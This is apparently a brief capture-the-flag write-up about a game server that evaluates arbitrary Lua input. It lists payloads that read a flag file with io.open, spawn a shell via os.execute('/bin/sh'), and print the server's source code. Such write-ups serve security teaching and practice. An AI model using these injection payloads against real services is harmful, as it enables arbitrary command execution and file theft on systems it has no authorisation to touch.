After connecting to the server, it display some sort of game. The interesting thing is that when we type help, it will print some binary-like data.

According to its first few bytes Lua, I suppose it is Lua bytecode. However, when I try to decompile or execute the binary, it seems to be corrupted. This writeup has described how to fix the binary, but during the contest, I just tried entering some function name shown in the binary like game and found that the function will be called. Furthermore, I found that it can actually execute arbitrary Lua function like io.write('hi'). I then entering io.write(io.open("flag", "r"):read("*all")) to read and print the flag.

payload1

io.write(io.open("flag", "r"):read("*all"))
io.write(io.open("flag", "r"):read("*all"))
flag{we_need_a_real_flag_for_this_chal}

payload2 
os.execute("/bin/sh")
os.execute("/bin/sh")


payload3 

os.execute("cat server.lua")
os.execute("cat server.lua")

